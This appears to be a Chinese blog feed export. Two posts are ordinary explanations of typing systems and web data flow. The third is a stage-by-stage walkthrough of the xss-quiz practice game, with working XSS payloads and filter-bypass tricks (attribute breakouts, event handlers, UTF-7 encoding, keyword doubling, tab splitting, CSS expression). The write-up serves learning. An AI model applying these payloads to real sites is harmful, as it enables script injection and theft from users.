    <url>/2016/12/09/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E5%88%86%E7%B1%BB/</url>
    <content><![CDATA[<h1 id="JavaScript语言精粹"><a href="#JavaScript语言精粹" class="headerlink" title="JavaScript语言精粹"></a>JavaScript语言精粹</h1><p>这本书买了很久，一是因为它薄，二是仔细看这本书，他确实涵盖了很多东西。</p>
<h1 id="静态语言和动态语言"><a href="#静态语言和动态语言" class="headerlink" title="静态语言和动态语言"></a>静态语言和动态语言</h1><p>先举个例子，C语言：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">float</span> pi = <span class="number">3.14159265</span>;</span><br></pre></td></tr></table></figure></p>
<p>JavaScript：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="string">"hello"</span>;</span><br><span class="line">alert(str);<span class="comment">//第一行之后，str就是是一个String类型了</span></span><br></pre></td></tr></table></figure>
<p>比较这两个方式。在C语言中，我们用<code>float</code>关键字定义了变量 <code>pi</code>，而JS并未使用这样的方式。<br></p>
<a id="more"></a>
<p>C语言是一种<code>静态类型</code>，在声明期 | 编译期就给定了变量的类型；在<code>静态类型</code>语言中，<strong>类型是从属于变量（变量改变类型需要类型声明改变）</strong>。从声明那一刻开始，变量只能被分配声明类型的数据（给定的数据类型 | 类型转换后的data）。那既然有这样的需求，静态语言会有一个<code>编译期</code>用于类型检测，这样就会产生<code>编译期</code>和<code>运行期</code>两个时期。<br><br>一些常见的静态类型语言： C++, C#, Java, Basic, Pascal, Ada 和 Fortran。<br></p>
<p>JavaScript语言是一种<code>动态类型</code>，变量类型可以在运行期间改变；在<code>动态类型</code>语言中，<strong>类型是从属于数据（数据类型改变影响了类型改变）</strong>。变量名只是指向了数据，他们可以在任何时刻指向任何类型的数据。既然不需要类型检测，那么，也就不需要区分<code>编译期</code>和<code>运行期</code>。<br><br>一些常见的动态类型语言： 大部分脚本语言和快速原型开发语言，例如，Javascript, Lisp, PHP, Python, Ruby, Scheme 等等。</p>
<h1 id="强类型与弱类型"><a href="#强类型与弱类型" class="headerlink" title="强类型与弱类型"></a>强类型与弱类型</h1><p><code>强弱类型</code>的概念没有<code>动态和静态类型</code>语言的区分那么清晰。一个最常见的定义方式：<strong>是否允许不相同类型之间的操作。</strong><br>例如，JS操作：<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> num = <span class="number">123</span>;</span><br><span class="line">num = num + <span class="string">'str'</span>;<span class="comment">//结果123str，JS可以不用在意不同类型的变量之间进行操作</span></span><br></pre></td></tr></table></figure></p>
<p>Java操作<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> num = <span class="number">123</span>;</span><br><span class="line">num = num +<span class="string">'str'</span>;<span class="comment">//异常，Java不允许不同类型之间的变量进行操作</span></span><br></pre></td></tr></table></figure></p>
<p>JS会隐式转换数字num为字符串，然后得出字符串结果。而Java不允许这样的转换（ClassCastException），因为这是一种过于灵活的表现。</p>
<p><code>弱类型</code>允许这样的快速开发，而<code>强类型</code>会在编译期捕获这种隐含的错误。<code>强类型</code>需要程序员关注类型转换，而<code>弱类型</code>更多的是通过大量的隐式（自动）转换完成了这些操作。</p>
<p><strong>P.S.</strong><br>一般来说，静态类型由于需要<code>编译期</code>进行类型检测。正常来讲，静态类型应该都是强类型，即不允许不同类型之间可以进行操作。<strong>而C和Basic语言却是特殊的不是强类型的静态类型语言。</strong><br><br>因为，C语言中，对于<code>Char</code>字符的操作，实际隐式转化为<code>int</code>进行操作，那么，这样的话，打破了强类型的规则。</p>
<h1 id="安全类型和不安全类型"><a href="#安全类型和不安全类型" class="headerlink" title="安全类型和不安全类型"></a>安全类型和不安全类型</h1><p>如何定义<code>安全</code>这个概念？对于异常进行捕获，将会导致程序停止，但是，如果不捕获异常，就会出现各种奇怪的行为。所以，安全类型会让语言在<code>编译期</code>捕获隐藏的异常，对于动态语言，将会在<code>运行期</code>捕获这些异常。<br><br>这里有一个误区：弱类型的语言缺乏安全性。这个概念是<strong>不对的</strong>，相反的，由于弱类型会把检测操作放在运行期，运行期检测有一个好处，所有的信息都处于待运行状态并且都可被获取，使得安全检测可以被更彻底的执行。<br><br>例如：C语言中的指针被认为是一种不安全的类型，而索引则被认为是一种安全的类型。</p>
<h1 id="各语言分类"><a href="#各语言分类" class="headerlink" title="各语言分类"></a>各语言分类</h1><table>
<thead>
<tr>
<th>Language</th>
<th>Static / Dynamic</th>
<th>Strong / Weak</th>
<th>Safety</th>
</tr>
</thead>
<tbody>
<tr>
<td>Ada</td>
<td>static</td>
<td>strong</td>
<td>safe</td>
</tr>
<tr>
<td>C</td>
<td>static</td>
<td>weak</td>
<td>unsafe</td>
</tr>
<tr>
<td>C++</td>
<td>static</td>
<td>strong</td>
<td>unsafe</td>
</tr>
<tr>
<td>Java</td>
<td>static</td>
<td>strong</td>
<td>safe</td>
</tr>
<tr>
<td>Javascript</td>
<td>dynamic</td>
<td>weak</td>
<td>safe</td>
</tr>
<tr>
<td>Lisp</td>
<td>dynamic</td>
<td>strong</td>
<td>safe</td>
</tr>
<tr>
<td>Pascal</td>
<td>static</td>
<td>strong</td>
<td>safe</td>
</tr>
<tr>
<td>Perl</td>
<td>dynamic</td>
<td>weak</td>
<td>safe</td>
</tr>
<tr>
<td>PHP</td>
<td>dynamic</td>
<td>weak</td>
<td>safe</td>
</tr>
<tr>
<td>Python</td>
<td>dynamic</td>
<td>strong</td>
<td>safe</td>
</tr>
<tr>
<td>Ruby</td>
<td>dynamic</td>
<td>strong</td>
<td>safe</td>
</tr>
</tbody>
</table>
<h1 id="综述"><a href="#综述" class="headerlink" title="综述"></a>综述</h1><h3 id="强弱类型-和-动静态语言区别："><a href="#强弱类型-和-动静态语言区别：" class="headerlink" title="强弱类型 和 动静态语言区别："></a><code>强弱类型</code> 和 <code>动静态语言</code>区别：</h3><p>这两个概念是有区别的，<code>强弱类型</code>的本质是<strong>是否允许不同类型之间进行操作</strong>，例如：<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//JavaScript</span></span><br><span class="line"><span class="keyword">var</span> i = <span class="number">1</span>;<span class="comment">//i 是number类型，数字</span></span><br><span class="line">i = i + <span class="string">"abc"</span><span class="comment">//不会报异常，结果为"1abc"</span></span><br></pre></td></tr></table></figure></p>
<p><code>弱类型</code>隐式转换了变量类型。</p>
<p>再如：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">//Python</span><br><span class="line">a = <span class="number">1</span>;//a是一个数字类型</span><br><span class="line">a = a+<span class="string">"abc"</span>//异常，不允许数字和字符串进行 <span class="string">"+"</span>操作</span><br></pre></td></tr></table></figure></p>
<p>python是一个<code>强类型</code>语言，不允许不同类型的变量之间的操作。</p>
<blockquote>
<p>这里强调一下，我一直以为，Python是动态的语言，所以一定是弱类型语言，但是其实Python是动态的强类型语言。所以说这两个概念是有区别的：强类型不允许不同类型之间的变量有操作。动态型使得变量的类型是由数据的类型所决定，而不是由关键字。</p>
</blockquote>
<p><code>动静态语言</code>是由变量的初始化方式所决定。<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Java</span></span><br><span class="line"><span class="keyword">int</span> a = <span class="number">1</span>;<span class="comment">//整型</span></span><br><span class="line"><span class="keyword">float</span> b = <span class="number">1.0</span>;<span class="comment">//浮点型</span></span><br></pre></td></tr></table></figure></p>
<p>变量的定义是关键字定义的。<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//JavaScript</span></span><br><span class="line"><span class="keyword">var</span> str = <span class="string">'abc'</span>;<span class="comment">//字符串类型</span></span><br><span class="line">str = <span class="number">123</span>;<span class="comment">//number类型</span></span><br></pre></td></tr></table></figure></p>
<p>变量的类型是由数据的类型所定义的。</p>
<p>参考：<a href="http://eli.thegreenplace.net/2006/11/25/a-taxonomy-of-typing-systems" target="_blank" rel="noopener">http://eli.thegreenplace.net/2006/11/25/a-taxonomy-of-typing-systems</a></p>
]]></content>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>前后端数据流导向</title>
    <url>/2016/12/08/%E5%89%8D%E5%90%8E%E7%AB%AF%E6%95%B0%E6%8D%AE%E6%B5%81%E5%AF%BC%E5%90%91/</url>
    <content><![CDATA[<h1 id="前后端数据流导向"><a href="#前后端数据流导向" class="headerlink" title="前后端数据流导向"></a>前后端数据流导向</h1><p>这只是我的一点个人总结，描述了一些前后端的数据走向，用于初学者对于Web端开发的理解。</p>
<h2 id="模板与ajax"><a href="#模板与ajax" class="headerlink" title="模板与ajax"></a>模板与ajax</h2><p>我初学JavaWeb接触到是Servlet | JSP开发；而我的朋友是从前端界面开始学起，经常听到他抱怨，后端一点都不懂，每次都是开发完毕以后由他人改模板；直到某一次，大神给我俩上了一堂课，我才明白了所谓的模板与前后端分离开发。<br><br>在我的理解中，模板分为两种：<code>Js模板（前端JavaScript开发的）</code>和<code>Jsp模板（后端Java开发的）</code>；这些模板的出现简化了<code>数据绑定</code>。</p>
<a id="more"></a>
<ol>
<li>后端模版的使用，例如Jsp，主要是在后端动态生成前端Html代码，数据绑定在生成Html的时候由Java拼接好，然后发送给用户，由浏览器解析。</li>
<li>而前端”模板”（姑且这么称呼），主要利用了JavaScript来实现。实际使用中，需要Js向服务端请求数据，然后操作Dom树实现数据绑定。例如，最常见的Ajax请求服务器接口，返回给Json数据，实现数据绑定。而一些前端框架，也借鉴了一些后端标签模板的绑定方式，自定义了一些标签来简化绑定操作。<br></li>
</ol>
<p>JSP模板：</p>
<p><img src="http://i.imgur.com/bupRErJ.png" alt></p>
<p>JS操作：</p>
<p><img src="http://i.imgur.com/O4dnoPP.png" alt></p>
<p>例如：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">JSP中最常见的一种语法：</span><br><span class="line">&lt;%=java代码%&gt;，就是一种很常见的模板写法。</span><br></pre></td></tr></table></figure>
<p>而前端去操作的话，会使用JavaScript：<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;div id=<span class="string">'title'</span>&gt;&lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">	$.ajax(&#123;</span><br><span class="line">        type: <span class="string">"get"</span>,</span><br><span class="line">        url: <span class="string">"data.json"</span>,</span><br><span class="line">        <span class="keyword">async</span>: <span class="literal">false</span>,</span><br><span class="line">        success: <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">            $(<span class="string">"#title"</span>).html(data.title);</span><br><span class="line">        &#125;,</span><br><span class="line">        error: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        &#125;</span><br><span class="line">	&#125;);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>可能都会基于此种方式。</p>
<p><strong>区别：</strong></p>
<ol>
<li>从思路上的区别，JSP更想用标签去替代一些AJax请求，直接生成静态页面返回给用户。</li>
<li>而使用JS去请求数据，使得前后端分工明确，前端开发可以不用去理解后端如何运作，而只需要获取数据，专心于界面美观等UI设计。而后端，也减少了界面上开发的痛苦。</li>
</ol>
<h3 id="如何使用模板和Ajax，什么时候用哪个？"><a href="#如何使用模板和Ajax，什么时候用哪个？" class="headerlink" title="如何使用模板和Ajax，什么时候用哪个？"></a>如何使用模板和Ajax，什么时候用哪个？</h3><blockquote>
<p>基于总体，一切从简。</p>
</blockquote>
<p>要符合整体设计，不能局限于局部的简单，而忽略整体的设计。过度的批判某一种技术都不是一种好的心态。</p>
<p>我做了一个非常简单的小Demo刚好展示了Ajax和模板的使用。</p>
<h2 id="get和post"><a href="#get和post" class="headerlink" title="get和post"></a>get和post</h2><p>我也经常混淆这两个的使用，直到一天看到有人说，为什么不从字面上理解呢？确实，get给人一种从服务器获取的感觉，而post是一种给出的意思。<br><br>为什么不用post呢，他完全可以替代get？我说，get和post区别？答：get是url请求，最大1kB；而post是能传输很大的。<br><br>字面上，get是获取，只是想从服务器上获取数据。那么，就像你去图书馆借书，你只需要给出书名就可以找到你想借的书了。而post更像是你去考试，你不可能只把姓名学号告诉老师就走了，你还要提交你写的试卷，那么此时，如果数据大于1kB，选择post才是你的唯一手段。而对于，简单的获取请求，使用post显得过于繁琐，而使用get却可以轻松地实现。</p>
<h2 id="Json与IO流"><a href="#Json与IO流" class="headerlink" title="Json与IO流"></a>Json与IO流</h2><p>IO流是我在学习Java时学习到的，这个操作是对数据的传输以流（可以理解为移动一壶水需要水的流动）的形式进行，有字节流和字符流两种形式。<br><br>而Json对象，在我眼里就是键值对（Map）数据结构，那为什么用Json和IO对比？<br>因为，在我所接触的开发中，这两种最常用，<strong>但是他俩却没有对比性</strong>，Json对象在传输时也是IO流，只是在源头增加了解析或者封装Json对象与流之间转换的方法。<br><br>但是这两个概念却经常被混淆，引用大神以前说的一句话<strong>“一切都是流”</strong>。<br><br>为什么有了Json？我用Json对象的感觉就是方便，尤其是Js的操作，更是简单易用，而Java虽然也有类似的数据结构HashMap，但是操作起来真的不是很方便。</p>
<p>所以，我认为：<strong>IO是传输的方式，而Json是为了应用而建立起来的规则，有点类似于TCP和HTTP之间的关系。</strong></p>
<p>IO在我使用中，有两次深刻的理解：</p>
<p>第一次是Servlet开发时，获取Post请求时，<code>request.getInputStream()</code>获取Post数据流，我知道了客户端服务器的交互就是数据流的交互。而对于Json，可以理解为对于收到的<strong>数据</strong>所封装的一种数据形式规则。<br></p>
<p>第二次是使用Java进行Socket编程，其中客户端与服务器之间的交互是IO流。我意识到，客户端与服务器之间的交互，都是IO或者说数据流之间的交互。而协议，例如Http，则是对于获取到的<strong>IO流</strong>转换为人们可理解的数据后形成的规则。<strong>流是数据传输的形式，而协议是构建应用的基础。</strong></p>
<p>所以我只想说一句话：<strong>一切都是流</strong>。</p>
]]></content>
      <tags>
        <tag>Web开发</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS过关小游戏~</title>
    <url>/2016/09/08/XSS%E8%BF%87%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/</url>
    <content><![CDATA[<blockquote>
<p>这个挺有意思的，好像日本的一个学生写的，入门XSS，感觉学到了不少！</p>
</blockquote>
<h1 id="第一关："><a href="#第一关：" class="headerlink" title="第一关："></a>第一关：</h1><blockquote>
<p><a href="http://xss-quiz.int21h.jp/?sid=7b714949025dc80a78855d84fc428ef4b4601ab5" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/?sid=7b714949025dc80a78855d84fc428ef4b4601ab5</a></p>
</blockquote>
<pre><code>&lt;img onerror=&quot;alert(document.domain);&quot; src= /&gt;
</code></pre><p>or</p>
<pre><code>&lt;script&gt;alert(document.domain);&lt;/script&gt;
</code></pre><a id="more"></a>
<h1 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h1><blockquote>
<p><a href="http://xss-quiz.int21h.jp/stage2.php?sid=8e7ed5afb72d0df250f54279ef8a868d8e0aafa7" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage2.php?sid=8e7ed5afb72d0df250f54279ef8a868d8e0aafa7</a></p>
</blockquote>
<p>先用</p>
<pre><code>&lt;script&gt;alert(document.domain);&lt;/script&gt;
</code></pre><p>检查源码，发现，组成</p>
<pre><code>&lt;INPUT size=50 value=&quot;&lt;script&gt;alert(document.domain);&lt;/script&gt;&quot; name=p1&gt;
</code></pre><p>没有过滤，可以组合js，闭合<code>value=&quot;&quot;</code>，进行注入！</p>
<pre><code>&quot;&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;&lt;
</code></pre><h1 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h1><blockquote>
<p><a href="http://xss-quiz.int21h.jp/stage-3.php?sid=387be4b596182a93c5eea6e6dfd85d69b23c9f82" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage-3.php?sid=387be4b596182a93c5eea6e6dfd85d69b23c9f82</a></p>
</blockquote>
<p>输入：</p>
<pre><code>&lt;script&gt;alert(document.domain);&lt;/script&gt;
</code></pre><p>源码显示：</p>
<pre><code>&amp;#60;script&amp;#62;alert(document.domain);&amp;#60;/script&amp;#62;
</code></pre><p>输入框发现使用特殊字符：<code>&lt;&gt;&quot;&quot;/ \</code>都被过滤了。<br>打开源码，<strong>不是审查元素</strong>：</p>
<pre><code>&lt;form action=&quot;?sid=83ba7c40f05160cdd42fec2bd6fd2f6d6ce5464f&quot; method=&quot;post&quot;&gt;
Search a place: &lt;input type=&quot;text&quot; name=&quot;p1&quot; size=&quot;30&quot;&gt;
&lt;input type=&quot;submit&quot; value=&quot;Search&quot;&gt; &amp;nbsp;
Choose a country: &lt;select name=&quot;p2&quot;&gt;
&lt;option&gt;Japan&lt;/option&gt;
&lt;option&gt;Germany&lt;/option&gt;
&lt;option&gt;USA&lt;/option&gt;
&lt;option&gt;United Kingdom&lt;/option&gt;
&lt;/select&gt;&lt;hr class=&quot;red&quot;&gt;We couldn&apos;t find any places called &lt;b&gt;&quot;&amp;lt;&amp;gt;&quot;&lt;/b&gt; in &lt;b&gt;Japan&lt;/b&gt;.&lt;hr class=&quot;red&quot;&gt;&lt;/form&gt;
</code></pre><p>可以看到特殊字符，被转译为<code>&amp;lt;&amp;gt;</code>等html字符。<br><br>卡住，看到：解析说输入框不止这一个，随后发现，form表单中还有另一个需要提交的数据，select框的数据，可以通过console修改select中的数据，进而修改提交的数据。而select是没有被过滤的！</p>
<p>修改dom：</p>
<pre><code>document.forms[0].p2.childNodes[1].innerHtml = &apos;&lt;script&gt;alert(document.domain);&lt;/script&gt;&apos;
</code></pre><p>发现innerHTML不能插入js，我需要js字符串，而不是代码，那么可以用innerText属性。</p>
<pre><code>document.forms[0].p2.childNodes[1].innerText = &apos;&lt;script&gt;alert(document.domain);&lt;/script&gt;&apos;
</code></pre><p>这样，select的第一个选项已经被修改，接下来随便输入并提交，ok。</p>
<h1 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h1><blockquote>
<p><a href="http://xss-quiz.int21h.jp/stage_4.php?sid=95a179f3d0230ffe9a4d12c5b049ea1aa9d27242" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage_4.php?sid=95a179f3d0230ffe9a4d12c5b049ea1aa9d27242</a></p>
</blockquote>
<p>此时，select和input均作了过滤，都不能进行注入，但是查看发现，有隐藏输入框，可以尝试注入。</p>
<pre><code>document.forms[0].p3.value = &apos;&quot;&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;&apos;
</code></pre><h1 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h1><blockquote>
<p><a href="http://xss-quiz.int21h.jp/stage--5.php?sid=d83cbbb5c8b5fc0b9bc4677c3a51287aa17b7adc" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage--5.php?sid=d83cbbb5c8b5fc0b9bc4677c3a51287aa17b7adc</a></p>
</blockquote>
<p>长度限制，发现限制了文本输入长度，但只在表面上做了限制。</p>
<pre><code>document.forms[0].p1.maxlength = 100
</code></pre><p>修改输入框输入内容长度限制。然后注入：</p>
<pre><code>document.forms[0].p1.value = &apos;&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&lt;&quot;&apos;
</code></pre><h1 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h1><blockquote>
<p><a href="http://xss-quiz.int21h.jp/stage-no6.php?sid=53cb838f6fe2a388b3e2adf56290494fe9edf999" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage-no6.php?sid=53cb838f6fe2a388b3e2adf56290494fe9edf999</a></p>
</blockquote>
<p>我还是太弱鸡了，竟然看了答案，这题还是比较好分析的。<br><br>输入特殊字符发现：<code>&quot;</code>未被过滤，可以截断value输入，但是字符 <code>&lt;&gt;</code> 被转译。<br><br>仍存在注入。<br><br>通过添加事件注入！<br></p>
<pre><code>&quot; onfocus=&quot;alert(document.domain);
</code></pre><p>or</p>
<pre><code>&quot; onfocus=&quot;alert(document.domain);&quot;
</code></pre><p>==================Don’t look boring==========================</p>
<p>Ps:<br></p>
<blockquote>
<p>当使用XSS时，分为三种类型:<br><br><strong>A</strong>:直接注入，可以截断属性，注入事件。</p>
</blockquote>
<pre><code>Script tags: &lt;script src=&quot; ;&gt;
Event handler attributes: &lt;body onload=&quot;alert(&apos;xss&apos;)&quot;&gt;
CSS: &lt;p style=&quot;background:url(&apos;javascript:alert(1)&apos;)&quot;&gt;
URLs:&lt;img src=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;
</code></pre><blockquote>
<p><strong>B</strong>.Proprietary extensions to HTML private development<br>私人开发专有扩展HTML，<strong>主要是针对只支持IE浏览器的私有标签！</strong></p>
</blockquote>
<pre><code>XML data islands(IE) :
&lt;xml src=&quot; ; id=&quot;x&quot;&gt;
&lt;span datasrc=&quot;#x&quot; datafld=&quot;c&quot; dataformatas=&quot;html&quot;&gt;
</code></pre><p>XML data islands(IE)(数据岛)(<a href="http://www.w3school.com.cn/xml/xml_dont.asp" target="_blank" rel="noopener">使用</a>)：</p>
<blockquote>
<p>1.是嵌入 HTML 页面中的 XML 数据。<br><br>2.XML 数据岛只在 Internet Explorer 浏览器中有效。<br></p>
</blockquote>
<pre><code>JavaScript expressions in attribute(NS4):
&lt;p id=&quot;&amp;{alert(&apos;XSS&apos;)}&quot;&gt;


Conditional comments(IE)
&lt;!--[if gte IE 4]&gt;
&lt;script&gt;alert(&apos;XSS&apos;)&lt;/script&gt;
&lt;![endif]--&gt;
</code></pre><p>Conditional comments(条件注释)：定义了一些通过IE执行的HTML标记</p>
<h1 id="第七关"><a href="#第七关" class="headerlink" title="第七关"></a>第七关</h1><blockquote>
<p><a href="http://xss-quiz.int21h.jp/stage07.php?sid=459abb17ecd98b0930668f93ee5beba7f81cf0e2" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage07.php?sid=459abb17ecd98b0930668f93ee5beba7f81cf0e2</a></p>
</blockquote>
<pre><code>&quot; onfocus=alert(document.domain);
</code></pre><p>上面第六关还是能注入，不知道后台验证怎么处理的？</p>
<h1 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h1><blockquote>
<p><a href="http://xss-quiz.int21h.jp/stage008.php?sid=69802cd8ff91f9b4fd0a84d9c67ff957cdd04cf5" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage008.php?sid=69802cd8ff91f9b4fd0a84d9c67ff957cdd04cf5</a></p>
</blockquote>
<p>当浏览器载入一个Javascript URL时，它会执行URL中所包含的Javascript代码。</p>
<blockquote>
<p>javascript:alert(document.domain);</p>
</blockquote>
<h1 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h1><blockquote>
<p><a href="http://xss-quiz.int21h.jp/stage_09.php?sid=8b17627ebee78fbe1bd2b569f8e2fd96c0934aa9" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage_09.php?sid=8b17627ebee78fbe1bd2b569f8e2fd96c0934aa9</a></p>
</blockquote>
<p>查看源码，发现提交数据时，带有一行数据编码：</p>
<pre><code>&lt;INPUT size=50 name=p1&gt;
&lt;INPUT type=hidden value=euc-jp name=charset&gt;
</code></pre><p>可以利用了IE对于UTF-7的漏洞，过滤对于UTF-7的不支持，以及IE对于UTF-7的漏洞！</p>
<h2 id="UTF-7"><a href="#UTF-7" class="headerlink" title="UTF-7"></a>UTF-7</h2><blockquote>
<p>用以将Unicode字符以ASCII编码的字符串来呈现。</p>
</blockquote>
<pre><code>&lt;INPUT name=&quot;charset&quot; type=&quot;hidden&quot; value=&quot;utf-7&quot; &gt;
</code></pre><p>将</p>
<pre><code>&quot; onfocus=&quot;alert(document.domain);
</code></pre><p>utf-7编码为：</p>
<pre><code>+ACI onfocus+AD0AIg-alert(document.domain)+ADs-
</code></pre><p>这个编码网站挺全的：</p>
<p><strong><a href="http://toolswebtop.com/text/process/encode" target="_blank" rel="noopener">http://toolswebtop.com/text/process/encode</a></strong>(<a href="http://toolswebtop.com/text/process/encode" target="_blank" rel="noopener">点击</a>)</p>
<h2 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a>第十关</h2><blockquote>
<p><a href="http://xss-quiz.int21h.jp/stage00010.php?sid=03afa49981651d6e65498615e3ea60525a79d6e3" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage00010.php?sid=03afa49981651d6e65498615e3ea60525a79d6e3</a></p>
</blockquote>
<p>发现过滤了domain关键字，关键词过滤，一定是用了正则表达式，那么怎么过正则表达式？</p>
<blockquote>
<p>例如他过滤了“domain”关键字，那么只要domain出现，就会被替换，那么可以在domain关键字中间再加一个，组成“dodomainmain”，这样中间的domain被过滤，剩下的部分组成domain，这样就越过了！（好机智！）</p>
</blockquote>
<pre><code>&quot; onfocus=&quot;alert(document.dodomainmain)&quot;
</code></pre><h1 id="第十一关："><a href="#第十一关：" class="headerlink" title="第十一关："></a>第十一关：</h1><blockquote>
<p><a href="http://xss-quiz.int21h.jp/stage11th.php?sid=8e2ec6beef278b3786780ab3b7fe5729b6746f83" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage11th.php?sid=8e2ec6beef278b3786780ab3b7fe5729b6746f83</a></p>
</blockquote>
<p>输入：</p>
<pre><code>&quot; onfocus=&quot;alert(document.dodomainmain)&quot;
</code></pre><p>查看页面源码：</p>
<pre><code>&lt;INPUT size=50 name=p1 ? onxxx=&quot;alert(document.dodomainmain)&quot;&gt;
</code></pre><p>查看提示：</p>
<blockquote>
<p>Hint: “s/script/xscript/ig;” and “s/on[a-z]+=/onxxx=/ig;” and “s/style=/stxxx=/ig;” </p>
<p>说明过滤了<code>on.*</code>等一大部分， <code>s.*</code>和<code>script.</code>会变成<code>&lt;xscript&gt;</code> </p>
<h2 id="制表符越过"><a href="#制表符越过" class="headerlink" title="制表符越过"></a>制表符越过</h2><p>输入：</p>
</blockquote>
<pre><code>&quot;&gt;&lt;a href=&quot;javascript:alert(document.domain);&quot;&gt;XSS&lt;/a&gt;
</code></pre><p>源码发现：</p>
<pre><code>&lt;A href=&quot;javaxscript:alert(document.domain);&quot;&gt;XSS&lt;/A&gt;
</code></pre><p>加入制表符：</p>
<pre><code>&quot;&gt;&lt;a href=&quot;javascri    p    t:alert(document.domain)&quot;;&gt;XSS&lt;/a&gt; //OK
</code></pre><p>过了！</p>
<p>疑惑：<br>为什么</p>
<pre><code>&quot; on&amp;#x09;focus=&quot;alert(document.dodomainmain)&quot;
</code></pre><p>过不去？</p>
<p>显示：</p>
<pre><code>&lt;INPUT size=50 name=p1 ? on&amp;#x09;focus=&quot;alert(document.dodomainmain)&quot;&gt;
</code></pre><p>但是，如果输入</p>
<pre><code>&quot; on&amp;#x09;focus=&quot;al&amp;#x09;ert(document.dodomainmain)&quot;
</code></pre><p>显示：</p>
<pre><code>&lt;INPUT size=50 name=p1 ? on&amp;#x09;focus=&quot;al&amp;#9;ert(document.dodomainmain)&quot;&gt;
</code></pre><p>这个HTML的转义应该是针对字符串的;</p>
<p>总结：以后尽量把结果引<code>&lt;a href=&quot;&quot;&gt;&lt;/a&gt;</code>。</p>
<h1 id="第十二关"><a href="#第十二关" class="headerlink" title="第十二关"></a>第十二关</h1><blockquote>
<p><a href="http://xss-quiz.int21h.jp/stage_no012.php?sid=5fce85f3ef5a811fe114d396d935edaf0ebde988" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage_no012.php?sid=5fce85f3ef5a811fe114d396d935edaf0ebde988</a></p>
</blockquote>
<p>发现，<code>&lt;&gt;``&quot;&quot;</code>单独使用并未过滤，但是<code>&lt;script&gt;</code>、<code>alert</code>是被过滤了</p>
<p>再看Hint：</p>
<pre><code>&quot;s/[\x00-\x20\&lt;\&gt;\&quot;\&apos;]//g;&quot; 
</code></pre><p><code>x00~x20</code>都被过滤，制表符无法使用了！，同样，<code>&lt;&gt; &quot;  &#39;</code>都被滤了！</p>
<h2 id="利用IE-的漏洞"><a href="#利用IE-的漏洞" class="headerlink" title="利用IE ``的漏洞"></a>利用IE ``的漏洞</h2><p>IE对于反单引号没有很好的过滤，使用  ``  可以很轻松的截断输入，但是在google下测试，发现 `` 被过滤了。<br>&gt;</p>
<blockquote>
<p><font color="red"><strong>`</strong></font>:反单引号，上排数字键1的前面，其上档符号是“~ ”</p>
</blockquote>
<p>可以截断输入，那就好办了！</p>
<pre><code>`` onfocus=&quot;alert(document.domain);&quot;  //IE下可行
</code></pre><h1 id="第十三关"><a href="#第十三关" class="headerlink" title="第十三关"></a>第十三关</h1><blockquote>
<p><a href="http://xss-quiz.int21h.jp/stage13_0.php?sid=609f8f638582fa34f0405165397b3498ff14ccc6" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage13_0.php?sid=609f8f638582fa34f0405165397b3498ff14ccc6</a></p>
</blockquote>
<p>如何在CSS样式中利用expression实现JavaScript中的onmouseover/onmouseout事件。<br><br>很奇怪，在ie11上，答案也不能成功，但是换了虚拟机里的IE8，成功。<br><br><strong>说明这个expression是一个浏览器兼容性的问题</strong>，解决这类兼容性xss漏洞，使用ie6即以下，效果可能更好！<br><br>附答案：</p>
<pre><code>aa:expression(onfocus = function(){alert(document.domain)})
</code></pre><blockquote>
<p>在CSS样式中注入这段代码就能弹了。。<br><br>但是现实环境中怎么可能有如此简单就能插入的地方。。<br><br>很难找到的说。。<br><br>话说，现实中怎么利用呢？<br><br>有2种注入：<br></p>
</blockquote>
<p>(1)@import 和 expression<br></p>
<pre><code>@import &quot;http://web/xss.css&quot;  
@import &apos;javascript:alert(&quot;xss&quot;)&apos;  
body{xss:expression(alert(&apos;xss&apos;))]  
